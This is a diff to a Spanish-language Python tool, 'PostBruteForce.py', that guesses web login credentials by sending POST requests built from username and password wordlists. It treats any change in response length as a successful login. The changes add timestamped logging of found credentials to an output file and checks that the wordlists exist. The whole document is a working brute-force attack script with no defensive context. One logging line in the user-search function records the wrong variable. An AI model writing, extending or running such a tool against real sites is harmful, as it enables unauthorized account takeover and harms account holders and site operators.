@@ -1,10 +1,11 @@
-import requests,sys, codecs, signal
+import requests,sys, codecs, signal, os
+from datetime import datetime
 from pwn import *
 from alive_progress import alive_bar
 
 ## VARIABLES GLOBALES
 grafico = "\n |\/\/\/|  \n |      |  \n |      |  \n | (o)(o)  \n C      _) \n  | ,___|       ¡Multiplicate por cero!\n  |   /    \n /____\    \n/      \ \n"
-ayuda = "Metodo de utilzación: python3 PostBruteForce.py \n                     --url [url] \n                     -u [nombre de usuario] -U [wordlist de usuarios] \n                     -p [password] -P [wordlist de passwords]"
+ayuda = "Metodo de utilzación: python3 PostBruteForce.py \n                      --url [url] -f [output]\n                      -u [nombre de usuario] -U [wordlist de usuarios] \n                      -p [password] -P [wordlist de passwords]"
 dataFalsa = {}
 data = {}
 url = ""
@@ -12,7 +13,9 @@ username = ""
 userlist = ""
 password = ""
 passlist = ""
-    
+outputPath = ""
+now = str(datetime.now())
+
     
 # METODO INFO, PROCESA ARGUMENTOS
 def info():
@@ -22,6 +25,7 @@ def info():
     global userlist 
     global password 
     global passlist 
+    global outputPath
 
     print(grafico)
     print("Script de fuerza bruta por metodo POST")
@@ -29,7 +33,7 @@ def info():
     
     #Minimo para funcionar
     
-    if len(sys.argv) < 5:
+    if len(sys.argv) < 3:
         
         print(ayuda)        
         sys.exit(1)
@@ -49,14 +53,20 @@ def info():
             password = sys.argv[x+1]
         if sys.argv[x] == "-P":
             passlist = sys.argv[x+1]
-    
+            
+        if sys.argv[x] == "-f":
+            outputPath = sys.argv[x+1]
+
+            
+            
     #Print de los parametros
     
     print ("-----\n> Url: ["+url+"]") 
     print ("> Username: ["+username+"]")
     print ("> Wordlist de usuarios: ["+userlist+"]")
     print ("> Password: ["+password+"]")
-    print ("> Wordlist de passwords: ["+passlist+"]\n-----")
+    print ("> Wordlist de passwords: ["+passlist+"]")
+    print ("> Path del output: ["+outputPath+"]\n-----")
     
     #Caso de url vacia
     
@@ -69,16 +79,28 @@ def info():
     # Se usan username y userlist o password y passlist a la vez
     # Falta un user o un password
     # Se mete un user y un pass individual
+    # No existe la worlist
     
     while True:
         if username != "" and passlist != "" and password == "" and userlist == "":
-            break
+            if os.path.exists(passlist):
+                break
+            else:
+                print("La worlist no existe")
+                
         if username == "" and passlist == "" and password != "" and userlist != "":
-            break
-        if username == "" and passlist != "" and password == "" and userlist != "":
-            break
+            if os.path.exists(userlist):
+                break
+            else:
+                print("La wordlist no existe")
         
-        print ("Error en los argumentos:\n")
+        if username == "" and passlist != "" and password == "" and userlist != "":
+            if os.path.exists(userlist) and os.path.exists(passlist):
+                break
+            else:
+                print("Las wordlists no existen")
+        
+        print ("\nError en los argumentos\n")
         print("\n"+ayuda+"\n")
         sys.exit(1)
         
@@ -147,7 +169,9 @@ def createData():
         else:
             return(1)
         
-        
+
+    
+
 def busquedaDoble():
     
     #Busqueda con doble wordlist, en user y password
@@ -158,29 +182,34 @@ def busquedaDoble():
         linesPassword = len(fp.readlines())
     with codecs.open(userlist, "r", encoding="ascii", errors="ignore") as fp:
         linesUser = len(fp.readlines())
+        
     fileuser = codecs.open(userlist, "r", encoding="ascii", errors="ignore")
+    output = ""
+    
     
     #Checkea la longitud de la respuesta de un intento erroneo de login
     
     reqCheck = requests.post(url, data=data, timeout=1)
-    reqCheck = reqCheck.text
-    lenCheck = len(reqCheck)
-    
+    reqText = reqCheck.content
+    lenCheck = len(reqText)
+
     #Inicio de los bucles anidados
     
     p = log.progress('Buscando combinaciones')
+    
     with alive_bar(linesUser*linesPassword, force_tty=True, title="Progress", ctrl_c=True) as bar:
         
         for user in fileuser.readlines():
             user = user.strip()
             filepass = codecs.open(passlist, "r", encoding="ascii", errors="ignore")
+            
             for password in filepass.readlines():
                 password = password.strip()
                 p.status("User: ["+user+ "] Password: ["+ password+"]")
                 count = 0
                 
                 #Introduce user y password por iteracion
-                
+        
                 for n in data:
                     if count==0:
                         data.update({n:user})
@@ -190,19 +219,25 @@ def busquedaDoble():
                     count = count+1
                 
                 #Intenta hacer la request con los parametros y compara la longitud con la erronea
-                
                 try:
                     req = requests.post(url, data=data, timeout=1)
-                    txt = req.text
+                    txt = req.content
                     lenReq = len(txt)
                     if lenReq > lenCheck or lenReq < lenCheck:
+                        output = output + now[:-7]+"\nHit en la url: "+url+"\n[ + ] User: "+user+ " Password: "+ password+"\n"
                         print("[ + ] User: "+user+ " Password: "+ password)
-                        
                 except:
                     pass
                 bar()
             filepass.close()
+            
+        
         fileuser.close()
+        
+    outputFile = codecs.open(outputPath, "a", encoding="ascii", errors="ignore")
+    outputFile.write(output)
+    outputFile.write("\n")
+    outputFile.close()
     return(1)
 
 def busquedaPass():
@@ -215,13 +250,15 @@ def busquedaPass():
         linesPassword = len(fp.readlines())
 
     filepass = codecs.open(passlist, "r", encoding="ascii", errors="ignore")
-    
+    output = ""
     
     #Checkea la longitud de la respuesta de un intento erroneo de login
+    
     
     reqCheck = requests.post(url, data=data, timeout=1)
     reqCheck = reqCheck.text
     lenCheck = len(reqCheck)
+    
     
     #Inicio del bucle
     
@@ -251,11 +288,16 @@ def busquedaPass():
                 txt = req.text
                 lenReq = len(txt)
                 if lenReq > lenCheck or lenReq < lenCheck:
+                    output = output + now[:-7]+"\nHit en la url: "+url+"\n[ + ] User: "+username+ " Password: "+ password+"\n"
                     print("[ + ] User: "+username+ " Password: "+ password)
             except:
                 pass
             bar()
         filepass.close()
+    outputFile = codecs.open(outputPath, "a", encoding="ascii", errors="ignore")
+    outputFile.write(output)
+    outputFile.write("\n")
+    outputFile.close()
     return(1)
     
 def busquedaUser():
@@ -269,6 +311,7 @@ def busquedaUser():
         linesUser = len(fp.readlines())
 
     fileuser = codecs.open(userlist, "r", encoding="ascii", errors="ignore")
+    output = ""
     
     #Checkea la longitud de la respuesta de un intento erroneo de login
     
@@ -303,21 +346,29 @@ def busquedaUser():
                 txt = req.text
                 lenReq = len(txt)
                 if lenReq > lenCheck or lenReq < lenCheck:
+                    output = output + now[:-7]+"\nHit en la url: "+url+"\n[ + ] User: "+username+ " Password: "+ password+"\n"
                     print("[ + ] User: "+user+ " Password: "+ password)
             except:
                 pass
             bar()
         fileuser.close()
+        
+    outputFile = codecs.open(outputPath, "a", encoding="ascii", errors="ignore")
+    outputFile.write(output)
+    outputFile.write("\n")
+    outputFile.close()
     return(1)
 
 if __name__ == '__main__':
     
     signal.signal(signal.SIGINT, handler)
     
+    
     info()
     checkUrl()
     createData()
     
+
     if username != "" and passlist != "" and password == "" and userlist == "":
         busquedaPass()
     if username == "" and passlist == "" and password != "" and userlist != "":
@@ -328,4 +379,5 @@ if __name__ == '__main__':
     sys.exit(1)
         
         
+
 
